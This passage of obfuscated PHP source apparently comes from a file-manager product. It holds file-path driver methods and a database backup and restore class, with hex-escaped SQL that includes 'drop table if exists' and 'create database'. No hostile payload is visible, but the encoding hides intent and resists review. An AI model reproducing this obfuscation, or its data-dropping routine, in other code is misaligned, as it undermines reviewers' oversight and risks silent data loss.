$this->model->pathInfo($ôÁ“ö¹ò[$_SERVER[ùèÅ´Ãš][194]]) : !1; } public function hashSimple($»Ä¹ÓÛà) { $ëŸÀÑ…Ë =& $_SERVER[ùèÅ´Ãš]; $éôºŒ¸Ì = $this->infoWithChildren($»Ä¹ÓÛà); return $éôºŒ¸Ì[$ëŸÀÑ…Ë[170]][$ëŸÀÑ…Ë[679]]; } public function hashMd5($Ò§û«º) { $Œõ™²µç =& $_SERVER[ùèÅ´Ãš]; $çµ—‘ƒª = $this->infoWithChildren($Ò§û«º); return $çµ—‘ƒª[$Œõ™²µç[170]][$Œõ™²µç[551]]; } public function exist($Ø¶¿û”) { $ã ¨ç±Ï =& $_SERVER[ùèÅ´Ãš]; $š ­­”³ = $this->parse($Ø¶¿û”); if (!$š ­­”³[$ã ¨ç±Ï[87]]) { return $this->isFile($Ø¶¿û”) || $this->isFolder($Ø¶¿û”); } $£¤Ù¡­æ = array($ã ¨ç±Ï[479] => $š ­­”³[$ã ¨ç±Ï[477]], $ã ¨ç±Ï[32] => $š ­­”³[$ã ¨ç±Ï[87]]); $Æ¯­øÑº = $this->model->where($£¤Ù¡­æ)->find(); return $Æ¯­øÑº ? !0 : !1; } public function isFile($Ùàµ¯›ß) { $ñ§º¸¬ =& $_SERVER[ùèÅ´Ãš]; $éÙ³åØ¶ = $this->infoSimple($Ùàµ¯›ß); return $éÙ³åØ¶ && $éÙ³åØ¶[$ñ§º¸¬[487]] == $ñ§º¸¬[231] ? !0 : !1; } public function isFolder($ÊÒÇ¸é•) { $ÃØİÙ¬¿ =& $_SERVER[ùèÅ´Ãš]; $¯ëûñ¡¼ = $this->infoSimple($ÊÒÇ¸é•); return $¯ëûñ¡¼ && $¯ëûñ¡¼[$ÃØİÙ¬¿[487]] == $ÃØİÙ¬¿[91] ? !0 : !1; } public function listPath($æ·Ø¡Œõ, $Óáƒ¼¹Î = false) { $âñª‡áé =& $_SERVER[ùèÅ´Ãš]; if ($æ·Ø¡Œõ == $âñª‡áé[12]) { return !1; } $›ƒßëâ½ = array($âñª‡áé[479] => $æ·Ø¡Œõ); if ($Óáƒ¼¹Î) { return $this->model->listSource($›ƒßëâ½, -1); } return $this->model->listSource($›ƒßëâ½); } public function has($šÄÈ¦Í, $€ŠÚ÷ÖŒ = false, $Šßë½À­ = null) { $ì¾ÉüƒŞ =& $_SERVER[ùèÅ´Ãš]; $ÒÛ×æêÀ = $this->infoWithChildren($šÄÈ¦Í); if ($€ŠÚ÷ÖŒ) { return array($ì¾ÉüƒŞ[243] => $ÒÛ×æêÀ[$ì¾ÉüƒŞ[243]], $ì¾ÉüƒŞ[242] => $ÒÛ×æêÀ[$ì¾ÉüƒŞ[242]]); } return $Šßë½À­ ? $ÒÛ×æêÀ[$ì¾ÉüƒŞ[243]] : $ÒÛ×æêÀ[$ì¾ÉüƒŞ[242]]; } public function listAll($²»®Î»«) { $ §›¿» = IO::info($this->pathParse[$_SERVER[ùèÅ´Ãš][87]]); if (!$ §›¿») { return array(); } return $this->model->listAll($²»®Î»«); } public function getContent($¡¬±Œ‹ß) { return $this->model->getContent($¡¬±Œ‹ß); } public function setContent($Óº†ËÉ, $È“ Âş” = '') { return $this->model->setContent($Óº†ËÉ, $È“ Âş”); } public function fileSubstr($ØÌø­¿Ö, $ß¥¹³Î‹, $ÖûŸï—) { return $this->model->fileSubstr($ØÌø­¿Ö, $ß¥¹³Î‹, $ÖûŸï—); } public function download($˜íÓÎ×, $ß¤¶ğò­ = '') { $‡³ÒúÇØ = get_path_father($ß¤¶ğò­); $•Éö•† = get_path_this($ß¤¶ğò­); $åñÍ‰ = $this->model->fileInfoGet($˜íÓÎ×); $ËëèŞ¿¶ = IO::copy($åñÍ‰[$_SERVER[ùèÅ´Ãš][87]], $‡³ÒúÇØ, !1, $•Éö•†); return $ËëèŞ¿¶; } public function setModifyTime($ùİÃßä¯, $¥ñôôü = '') { $º”ÙèÒİ =& $_SERVER[ùèÅ´Ãš]; if (!$ùİÃßä¯) { return; } $this->model->where(array($º”ÙèÒİ[493] => $ùİÃßä¯))->save(array($º”ÙèÒİ[88] => $¥ñôôü)); } public function upload($µÃœìÚ©, $½œÕ‡ã˜, $å´¢» = false, $Ñ¨¶Ğ™Ñ = REPEAT_REPLACE) { $ë£Ï±ÖË =& $_SERVER[ùèÅ´Ãš]; $ŸÃÂ©å = $this->parse($µÃœìÚ©); $ºı³šô‰ = $this->model->addFile($ŸÃÂ©å[$ë£Ï±ÖË[477]], $½œÕ‡ã˜, $ŸÃÂ©å[$ë£Ï±ÖË[87]], $å´¢», $Ñ¨¶Ğ™Ñ); return $this->getPathOuter($ºı³šô‰); } public function uploadFileByID($ÔØğò¦¥, $ÄêÃÍØ¦, $½é®íí) { $È †ü¼Ô =& $_SERVER[ùèÅ´Ãš]; $êû©½ÊÅ = $this->parse($ÔØğò¦¥); $ÔÍŠË® = $this->model->addFileByFileID($êû©½ÊÅ[$È †ü¼Ô[477]], $ÄêÃÍØ¦, $êû©½ÊÅ[$È †ü¼Ô[87]], $½é®íí); return $this->getPathOuter($ÔÍŠË®); } public function addFileByRemote($×•ÉÛôÏ, $áë£¶˜Ü, $âÂ‘¨½± = array(), $éü÷¬èû = '', $¶éœ…¡·) { $ç’•ê’ =& $_SERVER[ùèÅ´Ãš]; $„©ÁÚ°í = $this->parse($×•ÉÛôÏ); $éü÷¬èû = empty($éü÷¬èû) ? $„©ÁÚ°í[$ç’•ê’[87]] : $éü÷¬èû; $—¾½ìé› = $this->model->addFileByRemote($„©ÁÚ°í[$ç’•ê’[477]], $áë£¶˜Ü, $éü÷¬èû, $âÂ‘¨½±, $¶éœ…¡·); return $this->getPathOuter($—¾½ìé›); } public function uploadLink($­±šÔ÷ì, $èÙÇºğø = 0) { $¬Öİ«ıï =& $_SERVER[ùèÅ´Ãš]; $¿¤² = $this->parse($­±šÔ÷ì); $‹’İ†ç = _get($GLOBALS[$¬Öİ«ıï[7]], $¬Öİ«ıï[1444]); $¡Ú¦ŸŞÄ = _get($GLOBALS[$¬Öİ«ıï[7]], $¬Öİ«ıï[1445]); $’¹íîü = KodIO::ioFileDriverGet($¬Öİ«ıï[485] . $¿¤²[$¬Öİ«ıï[477]] . $¬Öİ«ıï[404]); $İˆïØ¾Õ = Model($¬Öİ«ıï[681])->createFileName($¿¤²[$¬Öİ«ıï[87]], $’¹íîü, $‹’İ†ç, $¡Ú¦ŸŞÄ); return IO::uploadLink($İˆïØ¾Õ, $èÙÇºğø); } public function fileNameAuto($Öâæı•£, $¬íÈ± ¤, $“Éíôıñ = REPEAT_REPLACE, $´öıÑ = false) { return $this->model->fileNameAuto($Öâæı•£, $¬íÈ± ¤, $“Éíôıñ, $´öıÑ); } public function fileNameExist($õÍµùÎ, $¦ÔºéÏË) { return $this->model->fileNameExist($õÍµùÎ, $¦ÔºéÏË); } protected function _fileOut($ÇåÀæÍ¦, $æúì÷Õ– = false, $û÷­‚‹Í = false, $îï™ñÁÒ = '', $‡ö§™²€ = false) { $ë—Ó¢ß‰ =& $_SERVER[ùèÅ´Ãš]; $ËÚ“›áí = $this->model->sourceInfo($ÇåÀæÍ¦); if ($ËÚ“›áí[$ë—Ó¢ß‰[487]] == $ë—Ó¢ß‰[91]) { header($ë—Ó¢ß‰[1446]); die; } $õû†úª = $this->model->fileInfoGet($ÇåÀæÍ¦); $îï™ñÁÒ = $õû†úª[$ë—Ó¢ß‰[551]] ? $õû†úª[$ë—Ó¢ß‰[551]] : $îï™ñÁÒ; $€îÉ®ù = isset($GLOBALS[$ë—Ó¢ß‰[183]]) && is_array($GLOBALS[$ë—Ó¢ß‰[183]]) ? $GLOBALS[$ë—Ó¢ß‰[183]][$ë—Ó¢ß‰[32]] : $ËÚ“›áí[$ë—Ó¢ß‰[32]]; if ($‡ö§™²€) { return IO::fileOutServer($õû†úª[$ë—Ó¢ß‰[87]], $æúì÷Õ–, $€îÉ®ù, $îï™ñÁÒ); } IO::fileOut($õû†úª[$ë—Ó¢ß‰[87]], $æúì÷Õ–, $€îÉ®ù, $îï™ñÁÒ); } public function fileOut($é­™ ³, $È×÷‹–å = false, $¹„†®ôß = false, $´€­šƒË = '') { $this->_fileOut($é­™ ³, $È×÷‹–å, $¹„†®ôß, $´€­šƒË); } public function fileOutServer($ËĞ¢ñ, $îÑ®Ú¿„ = false, $¢Ü«È×ò = false, $‘‘¾ş™Ü = '') { $this->_fileOut($ËĞ¢ñ, $îÑ®Ú¿„, $¢Ü«È×ò, $‘‘¾ş™Ü, !0); } protected function _fileOutImage($ÁÆ·Êãú, $Ä¶ÜûÇÏ = 250) { $«·æû =& $_SERVER[ùèÅ´Ãš]; $µ°¯‚Òƒ = $this->model->pathInfo($ÁÆ·Êãú); if ($µ°¯‚Òƒ[$«·æû[487]] == $«·æû[91]) { show_json($«·æû[1447] . $ÁÆ·Êãú, !1); } $ëäŞ°Üì = $this->model->fileInfoGet($ÁÆ·Êãú); $µ°¯‚Òƒ[$«·æû[184]] = $ëäŞ°Üì[$«·æû[87]]; $GLOBALS[$«·æû[183]] = $µ°¯‚Òƒ; IO::fileOutImage($ëäŞ°Üì[$«·æû[87]], $Ä¶ÜûÇÏ); } public function fileOutImage($˜¡ÆŒ”å, $ï–†ùÊ³ = 250) { $this->_fileOutImage($˜¡ÆŒ”å, $ï–†ùÊ³); } public function fileOutImageServer($¶¹‹ıéµ, $êÌğİ¦Ä = 250) { $this->_fileOutImage($¶¹‹ıéµ, $êÌğİ¦Ä); } public function link($É“ƒ˜•™, $¬¼ô•ºƒ = '') { $»§¦£éƒ = $this->model->fileInfoGet($É“ƒ˜•™); return IO::link($»§¦£éƒ[$_SERVER[ùèÅ´Ãš][87]], $¬¼ô•ºƒ); } protected function parse($—“Ôãï¥) { $š£…ÌÁ¶ =& $_SERVER[ùèÅ´Ãš]; if (strstr($—“Ôãï¥, $š£…ÌÁ¶[8]) === !1) { return array($š£…ÌÁ¶[495] => intval($—“Ôãï¥), $š£…ÌÁ¶[87] => $š£…ÌÁ¶[12], $š£…ÌÁ¶[1443] => array()); } $îÕÚ£ = explode($š£…ÌÁ¶[8], trim($—“Ôãï¥, $š£…ÌÁ¶[8])); if (count($îÕÚ£) < 2) { show_tips(clear_html($—“Ôãï¥) . $š£…ÌÁ¶[1448]); } return array($š£…ÌÁ¶[495] => intval($îÕÚ£[0]), $š£…ÌÁ¶[87] => $îÕÚ£[1], $š£…ÌÁ¶[1443] => array_slice($îÕÚ£, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($´›ùî™”) { $this->pathParse = $´›ùî™”; $this->model = Model($_SERVER[ùèÅ´Ãš][1442]); } public function getPathOuter($Ü’à”Î) { $÷µ¡÷ö¸ =& $_SERVER[ùèÅ´Ãš]; if (!$Ü’à”Î) { return $Ü’à”Î; } $ìõ‡ÍŞ£ = $this->parse($Ü’à”Î); return trim(KodIO::makeShare($this->pathParse[$÷µ¡÷ö¸[477]], $ìõ‡ÍŞ£[$÷µ¡÷ö¸[477]]), $÷µ¡÷ö¸[8]); } protected function infoParse($Å„î’Ëğ, $ğİÇ×äº = false, $¬æ¡İ¤ = false) { $®¶ı»› =& $_SERVER[ùèÅ´Ãš]; $„öˆâà = $this->pathParse[$®¶ı»›[477]]; $«æ»â£º = trim($this->pathParse[$®¶ı»›[1263]], $®¶ı»›[8]); return Action($®¶ı»›[1449])->sharePathInfo($„öˆâà, $«æ»â£º, $ğİÇ×äº); } public function infoFull($øÌ¡ŠßË) { $ˆáĞ²ç¿ =& $_SERVER[ùèÅ´Ãš]; $€âˆ®ãì = explode($ˆáĞ²ç¿[8], trim($øÌ¡ŠßË, $ˆáĞ²ç¿[8])); if (count($€âˆ®ãì) > 1) { $ŞÄ¬¡àÏ = implode($ˆáĞ²ç¿[8], array_splice($€âˆ®ãì, 1)); $Í»ßš…Ë = $this->model->pathInfoByPath($€âˆ®ãì[0], $ŞÄ¬¡àÏ); if (!$Í»ßš…Ë) { return !1; } $this->pathParse[$ˆáĞ²ç¿[1263]] = $Í»ßš…Ë[$ˆáĞ²ç¿[194]]; } return $this->infoParse($øÌ¡ŠßË); } public function listAll($¿àÆıÑœ) { $ÅĞŠÕÀ =& $_SERVER[ùèÅ´Ãš]; $’éòÕçê = IO::info($this->pathParse[$ÅĞŠÕÀ[87]]); if (!$’éòÕçê) { return array(); } $Ø¿¼èÊä = $this->model->listAll($¿àÆıÑœ); $ŠãÓ‚çî = Model($ÅĞŠÕÀ[671])->getInfo($’éòÕçê[$ÅĞŠÕÀ[672]]); foreach ($Ø¿¼èÊä as &$øæ˜áÖı) { check_abort(); $øæ˜áÖı[$ÅĞŠÕÀ[90]] = Action($ÅĞŠÕÀ[1449])->_shareItemeParse($øæ˜áÖı[$ÅĞŠÕÀ[90]], $ŠãÓ‚çî); } unset($øæ˜áÖı); return $Ø¿¼èÊä; } } goto cÔ¦§·ÆÍ‰; F¾„¨é¦Çì: class DbManage { function __construct($…ÄÆØïÏ = array()) { $İ­Ö“Íµ =& $_SERVER[ùèÅ´Ãš]; if (empty($…ÄÆØïÏ)) { $…ÄÆØïÏ = $GLOBALS[$İ­Ö“Íµ[6]][$İ­Ö“Íµ[21]]; } $this->database = $…ÄÆØïÏ; } public function model($â¿õ¤ ­ = '') { return new ModelBase($â¿õ¤ ­, $_SERVER[ùèÅ´Ãš][12], $this->database); } public function db($¹ìĞĞ·› = false) { $ÏĞ¶ç¶• =& $_SERVER[ùèÅ´Ãš]; $İÙ¼û½• = array_change_key_case($this->database); if ($this->dbType() == $ÏĞ¶ç¶•[13] || !$¹ìĞĞ·›) { return $this->model()->db(); } $‘ˆÀúÓ = $İÙ¼û½•[$ÏĞ¶ç¶•[1060]]; $İÙ¼û½•[$ÏĞ¶ç¶•[1060]] = $ÏĞ¶ç¶•[12]; if ($İÙ¼û½•[$ÏĞ¶ç¶•[1055]] == $ÏĞ¶ç¶•[1052]) { $åÈ¥ÏÚŸ = $İÙ¼û½•[$ÏĞ¶ç¶•[1061]]; $İÙ¼û½•[$ÏĞ¶ç¶•[1061]] = substr($åÈ¥ÏÚŸ, 0, strrpos($åÈ¥ÏÚŸ, $ÏĞ¶ç¶•[1147])); } $this->database = $İÙ¼û½•; $Õ¢¿ÙÕ’ = $this->model()->db(); try { $Ç´»ÁÖ€ = $Õ¢¿ÙÕ’->execute("\163\150\157\167\40\144\141\164\x61\x62\141\163\x65\x73\40\154\151\x6b\x65\x20\x27{$‘ˆÀúÓ}\47"); } catch (Exception $¬§ñª’ƒ) { } if (!$Ç´»ÁÖ€) { $Õ¢¿ÙÕ’->execute("\143\x72\x65\141\x74\x65\x20\144\x61\164\141\142\x61\163\145\40\140{$‘ˆÀúÓ}\x60"); } $İÙ¼û½•[$ÏĞ¶ç¶•[1060]] = $‘ˆÀúÓ; if ($İÙ¼û½•[$ÏĞ¶ç¶•[1055]] == $ÏĞ¶ç¶•[1052]) { $İÙ¼û½•[$ÏĞ¶ç¶•[1061]] .= $ÏĞ¶ç¶•[1147] . $‘ˆÀúÓ; } $this->database = $İÙ¼û½•; $Õ¢¿ÙÕ’->execute("\165\x73\145\40\140{$‘ˆÀúÓ}\140"); return $Õ¢¿ÙÕ’; } public function createTable($´¨ ´–‚, &$É—é“à) { $ÑÓ‚Ç­  =& $_SERVER[ùèÅ´Ãš]; if (!IO::exist($´¨ ´–‚)) { ActionCall($ÑÓ‚Ç­ [1148], !0, 0); show_json(LNG($ÑÓ‚Ç­ [1149]), !1); } $Ûá»©¨à = $this->model()->db(); $¬¦¼ê = sqlSplit(IO::getContent($´¨ ´–‚)); foreach ($¬¦¼ê as $¦ èÙ¬©) { $²×‘Ó»œ = stripos($¦ èÙ¬©, $ÑÓ‚Ç­ [1150]) === 0; if ($²×‘Ó»œ) { $É—é“à->task[$ÑÓ‚Ç­ [1151]] += 1; } $Ûá»©¨à->execute($¦ èÙ¬©); if ($²×‘Ó»œ) { preg_match($ÑÓ‚Ç­ [1152], $¦ èÙ¬©, $Ó é¥Ã©); $É—é“à->task[$ÑÓ‚Ç­ [1153]] = $Ó é¥Ã©[1]; $É—é“à->update(1); } } } public function insertTable($¶Í›ÅÂ , &$ş™åğê‹) { $ÌÎ„­³¥ =& $_SERVER[ùèÅ´Ãš]; $ÖÄ÷Ï£¦ = $this->model()->db(); $õÉ˜¹Íè = $²‹ÚÒİ ? array($²‹ÚÒİ) : $ÖÄ÷Ï£¦->getTables(); foreach ($¶Í›ÅÂ  as $Íèçª“ı) { $²‹ÚÒİ = basename($Íèçª“ı, $ÌÎ„­³¥[868]); if (!in_array($²‹ÚÒİ, $õÉ˜¹Íè)) { continue; } $ş™åğê‹->task[$ÌÎ„­³¥[1153]] = $²‹ÚÒİ; if (get_filesize($Íèçª“ı) == 0) { continue; } $ÆŠİîù = $this->sqlToDb($Íèçª“ı, $ş™åğê‹); if (!$ÆŠİîù) { ActionCall($ÌÎ„­³¥[1148], !0, 0); show_json(LNG($ÌÎ„­³¥[1154]) . "\133{$²‹ÚÒİ}\135", !1); } } } public function sqlFromDb($şœ´Ìä©, $·Ñ×öÙï, &$ş½ §€©, $¾ø¯Æ½ù = '') { if ($ş½ §€©) { $ş½ §€©->task[$_SERVER[ùèÅ´Ãš][1153]] = $şœ´Ìä©; } $Ùæ·±Á¹ = $this->model($şœ´Ìä©); $í‡áùà = 0; $™ëÉşâ = 0; $ÑÈ‘Ú©Æ = 10000; $§óöÏØ = fopen($·Ñ×öÙï, $_SERVER[ùèÅ´Ãš][1155]); $Ş±¸ö¹ø = $Ùæ·±Á¹->getPk(); $²™ôÎ­” = $Ùæ·±Á¹->getDbFields(); $®•€¨Ã¶ = $_SERVER[ùèÅ´Ãš][12]; if ($GLOBALS[$_SERVER[ùèÅ´Ãš][867]] && in_array($şœ´Ìä©, array($_SERVER[ùèÅ´Ãš][1156], $_SERVER[ùèÅ´Ãš][1157]))) { $®•€¨Ã¶ = $şœ´Ìä©; } do { $™Ÿ…´Ö = array($Ş±¸ö¹ø => array($_SERVER[ùèÅ´Ãš][1102], $™ëÉşâ)); $ˆÇ¿÷‹š = $Ùæ·±Á¹->where($™Ÿ…´Ö)->field($²™ôÎ­”)->order($Ş±¸ö¹ø . $_SERVER[ùèÅ´Ãš][1158])->limit($ÑÈ‘Ú©Æ)->select(); $ˆÇ¿÷‹š = !empty($ˆÇ¿÷‹š) ? $ˆÇ¿÷‹š : array(); if (!($İªÓ³¯µ = count($ˆÇ¿÷‹š))) { break; } $ëÑÚ”¼Å = end($ˆÇ¿÷‹š); $™ëÉşâ = $ëÑÚ”¼Å[$Ş±¸ö¹ø]; $¼ĞÛüÉ® = array(); foreach ($ˆÇ¿÷‹š as $í¾›¿¿) { if ($®•€¨Ã¶) { if ($şœ´Ìä© == $_SERVER[ùèÅ´Ãš][1156]) { if ($í¾›¿¿[$_SERVER[ùèÅ´Ãš][33]] == $_SERVER[ùèÅ´Ãš][1159]) { $É®Æğèå = json_decode($í¾›¿¿[$_SERVER[ùèÅ´Ãš][452]], !0); if ($É®Æğèå[$_SERVER[ùèÅ´Ãš][32]] == $GLOBALS[$_SERVER[ùèÅ´Ãš][867]] && $É®Æğèå[$_SERVER[ùèÅ´Ãš][827]] != 1) { continue; } } } else { if ($í¾›¿¿[$_SERVER[ùèÅ´Ãš][33]] == $_SERVER[ùèÅ´Ãš][1160] && $í¾›¿¿[$_SERVER[ùèÅ´Ãš][97]] == $_SERVER[ùèÅ´Ãš][863]) { continue; } } } if ($¾ø¯Æ½ù) { $í¾›¿¿[$_SERVER[ùèÅ´Ãš][87]] = "\x7b\x69\x6f\x3a{$¾ø¯Æ½ù}\x7d" . substr($í¾›¿¿[$_SERVER[ùèÅ´Ãš][87]], strlen("\173\x69\157\72{$í¾›¿¿[$_SERVER[ùèÅ´Ãš][901]]}\175")); $í¾›¿¿[$_SERVER[ùèÅ´Ãš][901]] = $¾ø¯Æ½ù; } $¼ĞÛüÉ®[] = $_SERVER[ùèÅ´Ãš][1161] . $this->sqlEncode($í¾›¿¿) . $_SERVER[ùèÅ´Ãš][1162]; } $‚ßĞé¹ = "\111\116\123\105\122\124\40\x49\116\124\117\40\x60{$şœ´Ìä©}\x60\40\50\x60" . implode($_SERVER[ùèÅ´Ãš][1163], $²™ôÎ­”) . $_SERVER[ùèÅ´Ãš][1164]; fwrite($§óöÏØ, $‚ßĞé¹ . implode($_SERVER[ùèÅ´Ãš][1165], $¼ĞÛüÉ®) . $_SERVER[ùèÅ´Ãš][74] . PHP_EOL); $í‡áùà += $İªÓ³¯µ; if ($ş½ §€©) { $ş½ §€©->update($İªÓ³¯µ); } } while ($ÑÈ‘Ú©Æ == $İªÓ³¯µ); fclose($§óöÏØ); return $í‡áùà; } public function sqlToDb($ñ“ˆš ¢, &$«ìøˆ¬) { $Îœä÷¦€ =& $_SERVER[ùèÅ´Ãš]; $‘æôÆÄ³ = $this->model()->db(); $¼ŒÕµªÀ = @fopen($ñ“ˆš ¢, $Îœä÷¦€[1166]); if (!$¼ŒÕµªÀ) { return !1; } $÷í¦Ôâö = 0; $ÜºªãÇ  = $Îœä÷¦€[12]; $¶ç¶ÎĞ = array(); $óé¹ªÔ¿ = $this->dbType(); $×ê¾—† = $óé¹ªÔ¿ == $Îœä÷¦€[13] ? 500 : 2000; $¦âíàš¸ = basename($ñ“ˆš ¢, $Îœä÷¦€[868]); $à˜çºîÀ = 0; $›òÄ‚ò  = 4194304; while (!feof($¼ŒÕµªÀ)) { $¦‹Û™îì = trim(fgets($¼ŒÕµªÀ)); if (!$¦‹Û™îì) { continue; } $°êÇùû· = $this->sqlDecode($¦‹Û™îì, $óé¹ªÔ¿, $¦âíàš¸); if (stripos($°êÇùû·, $Îœä÷¦€[432]) === 0) { if (!$ÜºªãÇ ) { $ÜºªãÇ  = $°êÇùû· . $Îœä÷¦€[53]; } continue; } if ($«ìøˆ¬) { $«ìøˆ¬->task[$Îœä÷¦€[1151]] += 1; } $÷í¦Ôâö++; $¶ç¶ÎĞ[] = rtrim(rtrim(trim($°êÇùû·), $Îœä÷¦€[50]), $Îœä÷¦€[74]); $¨ËÂğÚÃ = null; $³êÜ’Ç± = strlen($°êÇùû·); $à˜çºîÀ += $³êÜ’Ç±; $£íÇò° = strlen($ÜºªãÇ ) + $à˜çºîÀ + (count($¶ç¶ÎĞ) - 1); if ($£íÇò° >= $›òÄ‚ò ) { $¨ËÂğÚÃ = array_pop($¶ç¶ÎĞ); if ($÷í¦Ôâö > 1) { $÷í¦Ôâö--; } } if ($÷í¦Ôâö >= $×ê¾—† || $¨ËÂğÚÃ) { $°êÇùû· = $ÜºªãÇ  . implode($Îœä÷¦€[50], $¶ç¶ÎĞ); if (!$‘æôÆÄ³->execute($°êÇùû·)) { return !1; } if ($«ìøˆ¬) { $«ìøˆ¬->update($÷í¦Ôâö); } $¶ç¶ÎĞ = array(); $÷í¦Ôâö = 0; $à˜çºîÀ = 0; if ($¨ËÂğÚÃ) { $¶ç¶ÎĞ = array($¨ËÂğÚÃ); $÷í¦Ôâö = 1; $à˜çºîÀ = $³êÜ’Ç±; } } } fclose($¼ŒÕµªÀ); if (!empty($¶ç¶ÎĞ)) { $°êÇùû· = $ÜºªãÇ  . implode($Îœä÷¦€[50], $¶ç¶ÎĞ); if (!$‘æôÆÄ³->execute($°êÇùû·)) { return !1; } if ($«ìøˆ¬) { $«ìøˆ¬->update($÷í¦Ôâö); } } return !0; } public function dropTable($éã´ı· = null) { $ìº®„¤ = $this->model()->db(); $²ß·÷îÊ = $éã´ı· ? array($éã´ı·) : $ìº®„¤->getTables(); if (!$²ß·÷îÊ) { return; } foreach ($²ß·÷îÊ as $éã´ı·) { if ($éã´ı·) { $éã´ı· = strtolower($éã´ı·); } else { continue; } $ìº®„¤->execute("\x64\162\x6f\x70\x20\164\141\x62\x6c\145\x20\x69\146\x20\x65\x78\151\x73\x74\x73\40\x60{$éã´ı·}\140"); } } private function sqlEncode($ìÚÜ„³³) { $–ïŒüæé =& $_SERVER[ùèÅ´Ãš]; $îôà–øç = array(); foreach ($ìÚÜ„³³ as $¯Õ±çˆÈ) { if (is_array($¯Õ±çˆÈ)) { $¯Õ±çˆÈ = json_encode_force($¯Õ±çˆÈ); } $¯Õ±çˆÈ = addslashes($¯Õ±çˆÈ); $¯Õ±çˆÈ = str_replace(array($–ïŒüæé[1167], $–ïŒüæé[288], $–ïŒüæé[419]), array($–ïŒüæé[1168], $–ïŒüæé[1169], $–ïŒüæé[1170]), $¯Õ±çˆÈ); $îôà–øç[] = $¯Õ±çˆÈ; } return $–ïŒüæé[58] . implode($–ïŒüæé[1171], $îôà–øç) . $–ïŒüæé[58]; } private function sqlDecode($‚ƒÍÙâ×, $¡ôç“ÉØ, $¡ËŒ»ú¼ = '') { $Ş®Ë„Î¼ =& $_SERVER[ùèÅ´Ãš]; $‚ƒÍÙâ× = str_replace(array($Ş®Ë„Î¼[1168], $Ş®Ë„Î¼[1169], $Ş®Ë„Î¼[1170]), array($Ş®Ë„Î¼[1167], $Ş®Ë„Î¼[288], $Ş®Ë„Î¼[419]), $‚ƒÍÙâ×); if ($¡ôç“ÉØ == $Ş®Ë„Î¼[13]) { $‚ƒÍÙâ× = str_ireplace($Ş®Ë„Î¼[1172], $Ş®Ë„Î¼[59], $‚ƒÍÙâ×); $‚ƒÍÙâ× = stripslashes($‚ƒÍÙâ×); } return preg_replace($Ş®Ë„Î¼[1173], $Ş®Ë„Î¼[12], $‚ƒÍÙâ×); if ($¡ôç“ÉØ == $Ş®Ë„Î¼[13]) { return $¡ËŒ»ú¼ != $Ş®Ë„Î¼[862] ? stripslashes($‚ƒÍÙâ×) : $‚ƒÍÙâ×; } if ($¡ËŒ»ú¼ == $Ş®Ë„Î¼[862]) { $‚ƒÍÙâ× = str_replace($Ş®Ë„Î¼[1174], $Ş®Ë„Î¼[121], stripslashes($‚ƒÍÙâ×)); } return $‚ƒÍÙâ×; } public function getSqlFile($ßè›ü = '') { $Ğƒˆ³®Ğ =& $_SERVER[ùèÅ´Ãš]; $ÉËáÅóÁ = $this->dbType(!0); $ˆĞâş¢Ì = CONTROLLER_DIR . "\151\x6e\163\164\x61\154\x6c\x2f\x64\x61\164\141\x2f{$ÉËáÅóÁ}\x2e\163\x71\x6c"; if (!file_exists($ˆĞâş¢Ì)) { return !1; } $ıÂ°Ø™í = file_get_contents($ˆĞâş¢Ì); $åŸÒ‹«Ü = $Ğƒˆ³®Ğ[1175] . ($ÉËáÅóÁ == $Ğƒˆ³®Ğ[886] ? $Ğƒˆ³®Ğ[1176] : $Ğƒˆ³®Ğ[1177]) . $Ğƒˆ³®Ğ[1178]; preg_match_all($åŸÒ‹«Ü, $ıÂ°Ø™í, $ğ†œ¬µ); $æºà†² = $ğ†œ¬µ[1]; $Ö‘É¿‹ª = $this->model()->db(); $ÇÙ°³Ñ› = $Ö‘É¿‹ª->getTables(); $¸Õ¾¬á× = TEMP_FILES . $Ğƒˆ³®Ğ[1179] . date($Ğƒˆ³®Ğ[262]) . $Ğƒˆ³®Ğ[8]; del_dir($¸Õ¾¬á×); mk_dir($¸Õ¾¬á×); $ñÉ±Î•… = $¸Õ¾¬á× . $Ğƒˆ³®Ğ[1180]; $Ó¨¡« ´ = $¸Õ¾¬á× . $Ğƒˆ³®Ğ[1181]; $ïÎíÅ = $ÉËáÅóÁ == $Ğƒˆ³®Ğ[13] ? $Ğƒˆ³®Ğ[886] : $Ğƒˆ³®Ğ[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\x61\x6c\x6c\x2f\144\x61\164\141\57{$ïÎíÅ}\x2e\163\x71\x6c", $¸Õ¾¬á×); @touch($¸Õ¾¬á× . $ÉËáÅóÁ . $Ğƒˆ³®Ğ[868]); $ñ»±¯¿Ä = fopen($ñÉ±Î•…, $Ğƒˆ³®Ğ[1155]); $÷†Â¬× = fopen($Ó¨¡« ´, $Ğƒˆ³®Ğ[1155]); if ($ÉËáÅóÁ == $Ğƒˆ³®Ğ[13]) { $ÇÙ°³Ñ› = array_diff($ÇÙ°³Ñ›, array($Ğƒˆ³®Ğ[860], $Ğƒˆ³®Ğ[861])); $Ùáâ³¾Í = array($Ğƒˆ³®Ğ[1182], $Ğƒˆ³®Ğ[1183], $Ğƒˆ³®Ğ[1184]); fwrite($÷†Â¬×, implode(PHP_EOL, $Ùáâ³¾Í) . PHP_EOL . PHP_EOL); foreach ($ÇÙ°³Ñ› as $–ÓÜ¸®İ) { $İïË–Şø = $this->sqlFromSqlite($–ÓÜ¸®İ); if (!$İïË–Şø[$Ğƒˆ³®Ğ[13]]) { continue; } fwrite($÷†Â¬×, $İïË–Şø[$Ğƒˆ³®Ğ[13]] . PHP_EOL . PHP_EOL); if (!in_array($–ÓÜ¸®İ, $æºà†²)) { fwrite($ñ»±¯¿Ä, $İïË–Şø[$Ğƒˆ³®Ğ[886]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÇÙ°³Ñ› as $–ÓÜ¸®İ) { $İïË–Şø = $this->sqlFromMysql($–ÓÜ¸®İ); if (!$İïË–Şø[$Ğƒˆ³®Ğ[886]]) { continue; } fwrite($ñ»±¯¿Ä, $İïË–Şø[$Ğƒˆ³®Ğ[886]] . PHP_EOL . PHP_EOL); if (!in_array($–ÓÜ¸®İ, $æºà†²)) { fwrite($÷†Â¬×, $İïË–Şø[$Ğƒˆ³®Ğ[13]] . PHP_EOL . PHP_EOL); } } } fclose($ñ»±¯¿Ä); fclose($÷†Â¬×); $ıÂ°Ø™í = array($Ğƒˆ³®Ğ[886] => $ñÉ±Î•…, $Ğƒˆ³®Ğ[13] => $Ó¨¡« ´); return $ßè›ü ? $ıÂ°Ø™í[$ßè›ü] : $ıÂ°Ø™í; } 